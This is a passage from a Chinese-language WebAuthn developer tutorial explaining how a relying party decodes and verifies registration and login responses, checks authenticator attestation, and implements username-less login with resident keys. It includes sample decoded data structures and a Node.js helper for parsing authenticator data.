String</code>：表明依赖方是否需要证明。可选三个值：\n<ul>\n<li>\n<code>none</code>：（默认）不需要证明。如上文所述，依赖方不关心证明，因此认证器不会签名。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n<li>\n<code>indirect</code>：依赖方需要证明，但证明方式可由认证器选择。在支持匿名证明的认证器上，认证器会通过匿名证明的方式签名挑战，并向依赖方提供签名方式等信息</li>\n<li>\n<code>direct</code>：依赖方要求直接证明。此时认证器会使用烧录在认证器中的公钥进行签名，同时向依赖方提供签名方式等信息以供依赖方验证认证器是否可信。更多信息可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节</li>\n</ul>\n</li>\n<li>在 <code>authenticatorSelection</code> 中，我们还可以设置两个可选属性：\n<ul>\n<li>\n<code>authenticatorSelection.requireResidentKey: Boolean</code>：是否要求将私钥钥永久存储于认证器中。默认值为 <code>false</code>。对于 iOS/iPad OS 13，必须设置为 <code>false</code>，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n<li>\n<code>extensions: Object</code>：WebAuthn 扩展，可以提供规范之外的配置和响应。由于实际情况中很少会使用这一特性，我们不会在这篇文章中讨论它</li>\n\n<blockquote><p>将 <code>requireResidentKey</code> 设置为 <code>true</code> 可以实现无用户名的登录，即认证器同时替代了用户名和密码。需要注意的是，尽管大部分认证器可以实现无限对公私钥，<strong>但能永久存储的私钥数量是有限的</strong>（对于 Yubikey，这通常是 25），因此只应在真正需要的时候启用此特性。我们会在“<a href=\"https://flyhigher.top/#login-without-username\">无用户名登录</a>”一节中详细讨论原因。</p></blockquote>\n<blockquote><p><strong>如果你没有高安全需求（如银行交易等），请不要向认证器索取证明</strong>，即将 <code>attestation</code> 设置为 \"none\"。对于普通身份认证来说，要求证明不必要的，且会有浏览器提示打扰到用户。</p></blockquote>\n<blockquote><p>Android 暂时无法实施用户验证，进而会导致依赖方验证失败。你可以在<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=997538\">这里</a>追踪这个特性的实现情况。</p></blockquote>\n<blockquote>\n<p>对于 <code>extensions</code>，由于目前浏览器支持和应用范围有限，我们不会在这篇文章中涉及，不过你可以看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\n    uvm: true, // 要求认证器返回用户进行验证的方法\n    txAuthSimple: \"Please proceed\" // 在认证器上显示与交易有关的简短消息\n}</pre>\n<p>你可以在<a href=\"https://www.w3.org/2019/01/webauthn-extensions.html\">这个页面</a>了解更多关于 <code>extensions</code> 的信息。</p>\n</blockquote>\n<p>对于 <code>get()</code>，我们其实只有一个可选内容没讲了，即 <code>extensions</code>。和上文一样，我们不会在这篇文章中讨论它。</p>\n<p>就这些了！<span></span></p>\n<h2>手动解个码</h2>\n<p>是时候看看如何手动解码了。我们将会在这一节中讨论认证器返回的数据的结构以及如何正确地解码它们。</p>\n<p>首先我们来看看如何处理注册过程中认证器发回的数据。假设所有 <code>ArrayBuffer</code> 类型的值都被正确地以 Base64 编码，且后端已经将 JSON 的字符串解析为字典。先来复习一下，我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    id: \"ZRBkDBCEtq...9XY8atOcbg\",\n    type: \"public-key\",\n    rawId: \"ZRBkDBCEtq...9XY8atOcbg==\",\n    response: {\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...i5jcmVhdGUifQ==\",\n        attestationObject: \"o2NmbXRkbm9uZWd...xNHuAMzz2LxZA==\"\n    }\n}</pre>\n<p>这里的 <code>id</code> 就是凭证的 ID，如果验证正确，我们最终要将它存储起来并于用户关联。同时可以看到 Base64 编码后的 <code>rawId</code> 其实和 <code>id</code> 是一致的（不过 <code>id</code> 是 Base64URL 编码的）。而 <code>type</code> 则一定是 \"public-key\"。</p>\n<p>不过，我们主要关心的还是 <code>respose</code> 中的两项内容。首先是 <code>clientDataJSON</code>。它的处理比较简单，看名字就知道，它应该是一个 JSON 字符串。</p>\n<blockquote><p>小技巧：如果你看到一个 Base64 编码的字符串以 \"ey\" 开头，那么它大概率是一个 Base64 编码的 JSON。</p></blockquote>\n<p>将<code>clientDataJSON</code> Base64 解码再 JSON 解码之后我们就能得到一个字典：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    challenge: \"NI4i1vsNmP2KHcmyFnBCKRVQPfHgg34SsYZUOPZY2lM\",\n    extra_keys_may_be_added_here: \"do not compare clientDataJSON against a template. See https://goo.gl/yabPex\",\n    origin: \"https://dev.axton.cc\",\n    type: \"webauthn.create\"\n}</pre>\n<p>结构一目了然。在这里，我们需要验证三项内容：</p>\n<ul>\n<li>\n<code>challenge</code> 和之前发送的一致</li>\n<li>\n<code>origin</code> 为创建凭证的页面的源（协议+主机名+端口号，并非 URL）</li>\n<li>\n<code>type</code> 为 \"webauthn.create\"</li>\n</ul>\n<p>同时可以注意到有一个奇怪的 <code>extra_keys_may_be_added_here</code>。这其实是 Google 在 Chrome 中搞的一点小把戏，有一定概率会出现，提醒我们需要将 JSON 解析后再验证键值以防额外插入的键值影响验证。具体信息你可以访问那个 URL 看一看。</p>\n<p>对于 Firefox，我们会多得到两项 <code>clientExtensions</code> 和 <code>hashAlgorithm</code> ，分别指明了客户端扩展数据和签名算法。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"3-4\">{\n    challenge: \"dg6ost6ujhAA0g6WqLe-SOOH-tbhvjW9Sp90aPKlLJI\",\n    clientExtensions: {},\n    hashAlgorithm: \"SHA-256\",\n    origin: \"https://dev.axton.cc\",\n    type: \"webauthn.create\"\n}</pre>\n<p>由于本文不考虑扩展数据，因此我们可以不考虑 <code>clientExtensions</code>。同时由于目前规范中指定的签名算法只有 SHA-256 一种，因此现阶段我们也可以简单地忽略 <code>hashAlgorithm</code>。</p>\n<p><code>clientDataJSON</code> 很简单地就处理完了。接下来我们要来看看 <code>attestationObject</code>。先来看看 <code>attestationObject</code> 的结构图示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"attestationObject 的结构\" width=\"1056\" height=\"532\" class=\"aligncenter size-full wp-image-2245\"></a>\n<p><code>attestationObject</code> 是 CBOR 编码后再被 Base64 编码的，因此我们需要额外对其进行 CBOR 解码。</p>\n<blockquote><p>CBOR (Concise Binary Object Representation, 简明二进制对象表示) 是一种多应用于物联网领域的编码方式，你可以将它看作体积更小、更方便物联网传输的二进制 JSON。大部分语言都可以找到对应的 CBOR 解码库。</p></blockquote>\n<p>我们当然不会手解 CBOR，直接来看看解开之后的样子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    fmt: \"none\",\n    attStmt: {},\n    authData: [211, 217, 43, 24, 199, ..., 97, 238, 166, 67, 107]\n}</pre>\n<p>这些键值的含义如下：</p>\n<ul>\n<li>\n<code>fmt</code>：标明证明的格式。WebAuthn 预定义了几种格式，分别为：\n<ul>\n<li>\n<code>none</code>：没有证明</li>\n<li>\n<code>packed</code>：为 WebAuthn 优化的证明格式</li>\n<li>\n<code>android-safetynet</code>：Android 使用的格式</li>\n<li>\n<code>android-key</code>：又是 Android 使用的格式</li>\n<li>\n<code>fido-u2f</code>：FIDO U2F 认证器使用的格式</li>\n<li>\n<code>tpm</code>：TPM 可信平台模块使用的格式</li>\n</ul>\n</li>\n<li>\n<code>attStmt</code>：证明对象，具体格式根据 <code>fmt</code> 的不同会有所不同</li>\n<li>\n<code>authData</code>：包含公钥、签名计数等来自认证器的数据</li>\n</ul>\n<p>诶，例子里的 <code>attStmt</code> 怎么是空的？还记得之前说的吗？大部分情况下，<strong>如果依赖方不要求证明，那么认证器不会签名挑战</strong>，于是 <code>fmt</code> 会变为 \"none\"，<code>attstmt</code> 会为空。如果不是高安全要求，我们可以只对这一种情况做支持。</p>\n<blockquote><p>注意，部分情况下 Firefox 会在不要求证明（即 <code>attestation</code> 为 \"none\"）时会返回 <code>fmt</code> 为 \"packed\" 的证明。<strong>这是符合规范的。</strong>此时认证器会进行自证明，你可以视情况进行处理。具体可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>对于非 \"none\" 的 <code>fmt</code> 我们稍后再谈，现在我们先来看看 <code>authData</code>。来复习一下 <code>authData</code> 的结构：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"authData 的结构\" width=\"1056\" height=\"384\" class=\"aligncenter size-full wp-image-2240\"></a>\n<p>对于它的解码比较简单粗暴，我们要做的就是根据图示将它切开，然后适当地转换类型。其中各部分的含义如下：</p>\n<ul>\n<li>\n<code>rpIdHash</code>：如其名，SHA-256 的 <code>rpId</code>，长度 32 字节</li>\n<li>\n<code>flags</code>：标识认证状态，长度 1 字节。其中 8 位分别为：\n<ul>\n<li>\n<code>ED</code>：是否有扩展数据</li>\n<li>\n<code>AT</code>：是否包含 <code>attestedCredentialData</code>。通常注册认证器时会包含 <code>attestedCredentialData</code>，而验证时不包含</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>\n<code>UV</code>：用户是否已验证</li>\n<li>保留位</li>\n<li>\n<code>UP</code>：用户是否在场</li>\n</ul>\n</li>\n<li>\n<code>signCount</code>：签名计数，长度 4 字节</li>\n<li>\n<code>attestedCredentialData</code>：包含公钥等凭据数据，变长。其结构如下：\n<ul>\n<li>\n<code>aaguid</code>：认证器的 AAGUID (Authenticator Attestation GUID)，对于同一型号的认证器，它们的 AAGUID 是相同的</li>\n<li>\n<code>credentialIdLength</code>：标识 <code>credentialId</code> 的长度，长度 2 字节</li>\n<li>\n<code>credentialId</code>：凭证 ID，和 <code>rawId</code> 一致，长度由 <code>credentialIdLength</code> 定义</li>\n<li>\n<code>credentialPublicKey</code>：CBOR 编码的 COSE 格式的凭证公钥，变长</li>\n</ul>\n</li>\n<li>\n<code>extensions</code>：扩展数据，变长，本文不讨论</li>\n</ul>\n<blockquote><p>出于隐私考虑，如果不要求证明，认证器会以 0 填充 AAGUID。</p></blockquote>\n<p>如果你的后端在使用 Node.js，这里有个工具函数可以帮你完成这一步（不考虑 <code>extensions</code>）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function parseAuthData(buffer){\n    let rpIdHash = buffer.slice(0, 32);\n    buffer = buffer.slice(32);\n  \n    let flagsBuf = buffer.slice(0, 1);\n    buffer = buffer.slice(1);\n\n    let flagsInt = flagsBuf[0];\n    let flags = {\n        up: !!(flagsInt &amp; 0x01),\n        uv: !!(flagsInt &amp; 0x04),\n        at: !!(flagsInt &amp; 0x40),\n        ed: !!(flagsInt &amp; 0x80),\n        flagsInt\n    }\n\n    let counterBuf = buffer.slice(0, 4);\n    buffer = buffer.slice(4);\n  \n    let counter = counterBuf.readUInt32BE(0);\n\n    let aaguid = undefined;\n    let credID = undefined;\n    let COSEPublicKey = undefined;\n\n    if(flags.at) {\n        aaguid = buffer.slice(0, 16);\n        buffer = buffer.slice(16);\n\n        let credIDLenBuf = buffer.slice(0, 2);\n        buffer = buffer.slice(2);\n\n        let credIDLen = credIDLenBuf.readUInt16BE(0);\n        credID = buffer.slice(0, credIDLen);\n\n        buffer = buffer.slice(credIDLen);\n        COSEPublicKey = buffer;\n    }\n\n    return {rpIdHash, flagsBuf, flags, counter, counterBuf, aaguid, credID, COSEPublicKey}\n}</pre>\n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>解开后，依赖方至少需要做四件事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>存储签名计数</li>\n<li>存储公钥</li>\n</ol>\n<blockquote><p>签名计数不一定从 0 开始。</p></blockquote>\n<p>对于公钥，也就是 <code>credentialPublicKey</code>，我们需要多一次 CBOR 解码，然后就可以得到类似这样的公钥：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    kty: \"EC\",\n    alg: \"ECDSA_w_SHA256\",\n    crv: \"P-256\",\n    x: \"ZGQALNfqo0L7HFYQHFHCS/X5db49z0ePnuQEs3w3X8w=\",\n    y: \"6qYxhnjYuez/Q8N6vX7nIIGfxFWdZ25NzQfZYuYOalA=\"\n}</pre>\n<p>然后可以选择适当的方法将其存储起来，之后的步骤本文就不再赘述了。现在，将目光拉回来，让我们看看包含证明的 <code>attestationObject</code> 是怎么样的。我们来看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    fmt: \"packed\",\n    attStmt: {\n        alg: -7,\n        sig: [48, 70, 2, 33, 0, ..., 132, 78, 46, 100, 21],\n        x5c: [\n            [48, 130, 2, 189, 48, 130, 1, 165, 160, 3, ..., 177, 48, 125, 191, 145, 24, 225, 169, 41, 248]\n        ]\n    },\n    authData: [211, 217, 43, 24, 199, ..., 158, 54, 87, 126, 54]\n}</pre>\n<p>这里有一个使用 \"packed\" 格式的证明。此时，<code>attStmt</code> 中包含三个值：</p>\n<ul>\n<li>\n<code>alg</code>：签名算法</li>\n<li>\n<code>sig</code>：签名值</li>\n<li>\n<code>x5c</code>：X.509 编码的证书链</li>\n</ul>\n<p>我们不会在这一节中详述对签名的验证。要了解更多信息，你可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。现在，让我们来看看如何处理验证过程中认证器发回的数据。我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    id: \"hmqdxPLit9...BWeVxZqdvU\",\n    type: \"public-key\",\n    rawId: \"hmqdxPLit9V...BWeVxZqdvU=\",\n    response: {\n        authenticatorData: \"09krGMcWTf...UFAAAABA==\",\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...XRobi5nZXQifQ==\",\n        signature: \"UsXZV3pvT3np8btj6V0g...WBkaqyt88DrD40qh+A==\",\n        userHandle: \"MmYxNWYzZjQyZjM...Tg2ZDY4NzhlNw==\"\n    }\n}</pre>\n<p><code>id</code>, <code>rawId</code> 和 <code>type</code> 和之前一样，这里就不再赘述了。让我们来看看 <code>response</code>。首先是 <code>clientDataJSON</code>，和之前的解法一样，要验证的内容也一样，只是 <code>type</code> 从 \"webauthn.create\" 变成了 \"webauthn.get\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    challenge: \"bnkd2CmrEuvKnAFXs2QlC3SKlg4XFvGtP4HJL1yEWyU\",\n    origin: \"https://dev.axton.cc\",\n    type: \"webauthn.get\"\n}</pre>\n<p>然后是 <code>userHandle</code>。前面讲过，这是认证器在创建凭证时的用户 ID。如果用户在使用 U2F 认证器，很可能这一项为空，所以大部分情况下我们不关心这一项。</p>\n<p>接着来看 <code>authenticatorData</code>。这其实就是之前的 <code>attestedCredentialData</code>，只是这次不包含公钥。以相同的方式切开数据，我们应该可以得到 <code>rpIdHash</code>, <code>flags</code>和 <code>signCount</code> 三项。此时，依赖方至少需要做这三样事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>验证签名计数大于之前存储的计数，并更新存储的计数</li>\n</ol>\n<blockquote><p>如果签名计数比之前的小，那么这个认证器很可能是伪造的，应该中止验证并返回验证失败。同时，签名计数不一定每次按 1 递增，通常只要计数比此前的大就认为计数检查通过。</p></blockquote>\n<p>最后，我们来看 <code>signature</code>，也就是签名。不过这个签名不是简单的对挑战的签名，具体算法如图所示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"签名过程\" width=\"1034\" height=\"587\" class=\"aligncenter size-full wp-image-2231\"></a>\n<p>计算签名时，认证器会将 <code>authenticatorData</code> 与 <code>clientDataHash</code>（也就是 <code>clientDataJSON</code> 的 SHA-256 Hash）拼接起来，并使用对应的私钥签名。依赖方应该使用对应的公钥将其解密，并验证内容是否是 <code>authenticatorData</code> 与 <code>clientDataHash</code> 的拼接。这部分的计算不在本文的讨论范围内。</p>\n<p>最后，如果全部验证通过，返回验证成功。<span></span></p>\n<h2>验证认证器</h2>\n<p>WebAuthn 已经很安全了，但有的时候我们还要让它更安全一点。比如，如果用户在使用伪造的或是自制的认证器，认证器的安全性就得不到保证。此时，依赖方就需要验证认证器是否是可信的认证器。</p>\n<blockquote><p>这一过程仅发生在注册认证器时。此时，如果认证器验证通过，就可以存储公钥，后续步骤和之前描述的一致。</p></blockquote>\n<blockquote><p>再次说明，如果不是对安全性有极高的要求，向认证器索取证明以验证认证器是否可信是没有必要的。此外，验证认证器需要依赖方自行维护可信认证器列表，大大增加了维护的复杂性。</p></blockquote>\n<p>在调用 <code>navigator.credentials.create()</code> 时，我们可以将 <code>attestation</code> 设置为非 \"none\" 来向认证器索取证明。除无证明外，WebAuthn 定义了四种证明方式：</p>\n<ul>\n<li>Basic Attestation (Basic) ：基础的证明方式，认证器会使用认证器私钥签名</li>\n<li>Self Attestation (Self) ：自证明，认证器会使用凭证私钥签名</li>\n<li>Attestation CA (AttCA) ：认证器会使用多个证明私钥之一签名</li>\n<li>Elliptic Curve based Direct Anonymous Attestation (ECDAA) ：通过 <a href=\"https://en.wikipedia.org/wiki/Direct_Anonymous_Attestation\">DAA</a> 实现的匿名证明</li>\n</ul>\n<blockquote><p>和验证过程一样，这里签名的目标是 <code>authenticatorData</code> 和 <code>clientDataHash</code> 的连接。</p></blockquote>\n<p>还记得 <code>create()</code> 时 <code>attestation</code> 可选的三个值吗？这个值会决定认证器最终使用哪种方式进行证明。复习一下：</p>\n<ul>\n<li>\n<code>none</code>：大部分情况下认证器会选择不进行证明，部分认证器会进行自证明。此时 AAGUID 会被 0 填充</li>\n<li>\n<code>indirect</code>：认证器会试图通过替换 AAGUID 和选择合适的证明方式来进行匿名证明，具体方式由认证器选择</li>\n<li>\n<code>direct</code>：认证器会提供最直接的证明信息</li>\n</ul>\n<p>注意，大部分情况下，当认证器需要向依赖方证明自己可信时需要提供认证器公钥，<strong>这会触发浏览器提示，只有用户同意后认证器才会进行证明，否则认证器将不提供证明。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"浏览器提示\" width=\"446\" height=\"283\" class=\"aligncenter size-full wp-image-2217\"></a>\n<blockquote><p>为什么浏览器会说“安全密钥的品牌和型号”？事实上，为了避免用户通过认证器证书被跨依赖方追踪，FIDO 要求使用相同认证器证书的认证器的数量不能少于 100,000。于是大部分认证器厂商会选择<strong>让同一型号的认证器共用同一份证书。</strong>因此，浏览器的会询问用户是否同意“查看安全密钥的品牌和型号”。</p></blockquote>\n<blockquote><p>Android Safety Net 不会向用户询问是否同意，而是会静默进行证明。</p></blockquote>\n<p>当证明不为空时，依赖方收到数据后根据 <code>attestationObject.fmt</code> 的不同，需要选择不同的验证方式来验证认证器的可信情况。出于篇幅原因，这里我们不会讨论每一种 <code>fmt</code> 的验证方式，更多信息你可以查阅 <a href=\"https://www.w3.org/TR/webauthn/#defined-attestation-formats\">W3C 文档</a>。</p>\n<p>当 <code>fmt</code> 为 <code>packed</code> 时，<code>attestationObject.attStmt</code> 可能会有三种格式：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">// 自证明\n{\n    alg, // 算法\n    sig // 签名\n}\n// 基础或证明 CA 证明\n{\n    alg,\n    sig,\n    x5c // X.509 证书链\n}\n// 椭圆曲线证明\n{\n    alg,\n    sig,\n    ecdaaKeyId // ECDAA-Issuer 公钥标识符\n}</pre>\n<p>此时，依赖方需要检查证书符合预期格式并检查证书是否在可信链上。首先，如果证明中既没有 <code>ecdaaKeyId</code> 也没有 <code>x5c</code>，就说明这个证明使用的是自证明，只需使用认证器提供的公钥验证即可；如果有 <code>x5c</code>，那么就需要验证 <code>x5c</code> 中的证书是否在可信链上。将 <code>x5c</code> 中的每个证书以 Base64 编码，按 64 个字符切开，并在头尾加上 <code>-----BEGIN CERTIFICATE-----</code> 和 <code>-----END CERTIFICATE-----</code>就能得到一个证书字符串了。之后，依赖方需要验证证书是否可信。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function base64ToPem(b64cert){\n    let pemcert = '';\n    for(let i = 0; i \n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>至于 <code>ecdaaKeyId</code>，由于目前应用较少，处理方法可能需要你另寻资料了。检查证书的具体步骤已经超出了本文的范围，具体可以查阅<a href=\"https://medium.com/@herrjemand/verifying-fido2-packed-attestation-a067a9b2facd\">这篇文章</a>（英文）。</p>\n<blockquote><p>你可以在 <a href=\"https://fidoalliance.org/metadata/\">FIDO Metadata Service</a> 找到各大厂商认证器的可信证书链。</p></blockquote>\n<p>当在 Android 上调起 WebAuthn 时，大部分情况下 <code>fmt</code> 将会为 <code>safety-net</code>。此时 <code>attestationObject.attStmt</code> 的结构会是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    ver: \"200616037\",\n    response: {\n        type: \"Buffer\",\n        data: [101, 121, 74, 104, 98, ..., 115, 104, 104, 82, 65]\n    }\n}</pre>\n<p>此时，<code>clientDataJSON</code> 中还会出现 <code>androidPackageName</code> 键，值是调起 WebAuthn 验证的应用的包名，如 Chrome 就是 \"com.android.chrome\"。</p>\n<p>在这个证明中，<code>data</code> 其实是一个 JWT 字符串，我们可以将它编码为字符串并将其按照 JWT 进行解码（别忘了验证 JWT 签名）。最终我们会得到一个类似这样的 Payload：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    nonce: \"0QAurN4F9wik6GEkblDJhGuf4kuaqZn5zaaxlvD1hlA=\",\n    timestampMs: 1584950686460,\n    apkPackageName: \"com.google.android.gms\",\n    apkDigestSha256: \"2BQHno+bmWWwdLUYylS8HLt5ESJzci3nt2uui71ojyE=\",\n    ctsProfileMatch: true,\n    apkCertificateDigestSha256: [\n        \"8P1sW0EPicslw7UzRsiXL64w+O50Ed+RBICtay2g24M=\"\n    ],\n    basicIntegrity: true,\n    evaluationType: \"BASIC\"\n}</pre>\n<p>其中包含了有关设备状态的一些信息。比如说，如果 <code>ctsProfileMatch</code> 为 <code>false</code>，那么该设备很有可能被 root 了。对于高安全要求的场景，我们可以视情况进行验证。</p>\n<p>同时我们可以在 JWT Header 中验证证明的有效性。我们应该能取得这样的 Header：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\n    alg: \"RS256\",\n    x5c: [\n        \"MIIFkzCCBHugAwIBAgIR...uvlyjOwAzXuMu7M+PWRc\",\n        \"MIIESjCCAzKgAwIBAgIN...UK4v4ZUN80atnZz1yg==\"\n    ]\n}</pre>\n<p>这里的结构就和上方的 <code>x5c</code> 验证类似了。具体步骤可以参考<a href=\"https://medium.com/@herrjemand/verifying-fido2-safetynet-attestation-bd261ce1978d\">这篇文章</a>（英文）。</p>\n<p>其他所有格式的验证方式也都可以在<a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">这篇文章</a>（英文）中找到。<span></span></p>\n<h2>无用户名登录</h2>\n<p>认证器已经代替了密码，可是这还不够！在进行第一因素认证（即使用 WebAuthn 登录）时，我们还是需要输入用户名，然后才能进行身份认证。懒惰是第一生产力，我们能不能不输入用户名就进行身份认证呢？实际上，大部分认证器都允许我们无用户名登录。<strong>而这一特性的核心就是 Resident Key 客户端密钥驻留。</strong></p>\n<p>你可以思考一下，为什么普通的 WebAuthn 为什么不能实现无用户名登录？事实上，大部分认证器为了实现无限对公私钥，会将私钥通过 Key Warp 等技术加密后包含在凭证 ID 中发送给依赖方，这样认证器本身就不用存储任何信息。不过，这就导致需要身份认证时，依赖方必须通过用户名找到对应的凭证 ID，将其发送给认证器以供其算出私钥。</p>\n<blockquote><p>Yubikey 实现了一个基于 HMAC 的算法，认证器可以在私钥不离开认证器的前提下（常规的 Key Warp 算法中实际上私钥离开了认证器）通过一些输入和凭证 ID 重新计算私钥，你可以阅读<a href=\"https://www.yubico.com/blog/yubicos-u2f-key-wrapping/\">这篇文章</a>了解更多。</p></blockquote>\n<blockquote><p>客户端通过凭证 ID 查找对应认证器的算法根据系统的不同是不同的。通常凭证 ID 中会包含认证器信息，因此系统可以通过凭证 ID 找到对应的认证器。</p></blockquote>\n<p>要避免输入用户名，我们可以要求认证器将私钥在自己的内存中也存储一份。这样，依赖方无需提供凭证 ID，认证器就可以通过依赖方 ID 找到所需的私钥并签名公钥。以下是具体流程：</p>\n<p>注册时：</p>\n<ol>\n<li>依赖方请求新建凭证，同时要求启用客户端密钥</li>\n<li>认证器生成一对公私钥，并将私钥存储在永久内存中且与依赖方 ID 及用户 ID 绑定，随后将公钥发送给依赖方以供存储</li>\n<li>依赖方将用户 ID 即公钥与用户绑定</li>\n</ol><p>验证时：</p>\n<ol>\n<li>依赖方请求验证，但不必提供除依赖方 ID 以外的更多信息</li>\n<li>用户选择认证器</li>\n<li>认证器根据依赖方 ID 找到对应私钥</li>\n<li>如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录</li>\n<li>确定私钥后，认证器签名挑战并将其返回，同时返回用户 ID</li>\n<li>依赖方通过用户 ID 找到对应用户并用对应公钥检查签名，正确则允许对应用户登录</li>\n</ol><blockquote><p>可以看到，这个特性同时要求认证器存储用户 ID，即上面提到过的 <code>userHandle</code>。依赖方需要根据此信息找到对应用户，因此不支持 <code>userHandle</code> 的 U2F 认证器无法进行无用户名登录。</p></blockquote>\n<blockquote><p>如之前所说，<strong>认证器能永久存储的私钥数量是有限的</strong>，因此只应在真正需要无用户名登录的时候启用此特性。</p></blockquote>\n<blockquote><p>目前暂时没有办法检测认证器是否支持客户端密钥驻留，因此在无用户名验证失败时应 fallback 至常规的 WebAuthn 验证，即向用户询问用户名。</p></blockquote>\n<p>现在让我们来看看如何实现这一特性吧。首先，调用 <code>navigator.credentials.create()</code> 时我们需要注意两个参数：<code>requireResidentKey</code> 必须为 <code>true</code>，<code>userVerification</code> 必须为 \"required\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"5-6\">navigator.credentials.create({\n    publicKey: {\n        ...\n        authenticatorSelection: {\n            requireResidentKey: true,\n            userVerification: \"required\"\n            ...\n        },\n        ...\n    }\n})</pre>\n<blockquote><p>Windows Hello <strong>似乎</strong>会存储所有已注册的凭据，因此无论是否指定 <code>requireResidentKey</code>，你都可以通过 Windows Hello 进行无用户名登录。</p></blockquote>\n<p>随后，浏览器会询问用户是否允许认证器存储私钥。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"浏览器提示\" width=\"445\" height=\"285\" class=\"aligncenter size-full wp-image-2208\"></a>\n<p>如果用户同意，认证器会存储私钥，并和普通的 WebAuthn 一样返回信息。不过，依赖方收到数据之后，只需将公钥、用户 ID 与用户关联起来，而不必再将凭证 ID 与用户关联起来。至此注册完成。</p>\n<p>之后，在用户请求登录时，无需再向依赖方提供用户名。同时在传入 <code>navigator.credentials.get()</code> 的参数中也有两个需要注意：<code>userVerification</code> 必须为 \"required\"，同时 <code>allowCredentials</code> 必须为空。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"4-5\">navigator.credentials.get({\n    publicKey: {\n        ...\n        userVerification: \"required\",\n        allowCredentials: [],\n        ...\n    }\n})</pre>\n<blockquote><p>Android 暂不支持无用户名验证，空的 <code>allowCredentials</code> 会导致浏览器返回 <code>NotSupportedError</code> 错误。</p></blockquote>\n<p>此时，认证器会根据依赖方 ID 找到对应的私钥。如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录。用户选择后，认证器就会使用对应的私钥签名挑战并将其返回。此时，<code>userHandle</code> 一定不为空。</p>\n<p>依赖方收到数据后，需要将 <code>userHandle</code> 作为用户 ID 找到对应的用户，并使用对应的公钥验证签名。如果验证成功，则认为对应的用户身份认证成功，依赖方可以允许其登录。至此验证结束。</p>\n<blockquote><p>有的时候你可能会需要清除认证器中的密钥。绝大多数认证器都提供了对应的软件以供清除存储的密钥，但大部分情况下这会重置整个认证器，这意味着相关认证器此前的所有凭证均会失效。因此建议不要将日常使用的认证器作为开发测试用的认证器。</p></blockquote>\n<h2>从 U2F 认证迁移</h2>\n<p>如果你的服务此前提供了 U2F 第二因素认证，你可能会希望在将依赖方从 U2F 升级到 WebAuthn 时用户此前注册的 U2F 认证器仍然可用而无需重新注册。由于 WebAuthn 向后兼容 U2F 设备，用户是可以继续使用原有的 U2F 认证器的。不过，由于 WebAuthn 的依赖方 ID 与 U2F 的 <code>appid</code> 并不一定相同，你需要将原有的 U2F <code>appid</code> 随 WebAuthn 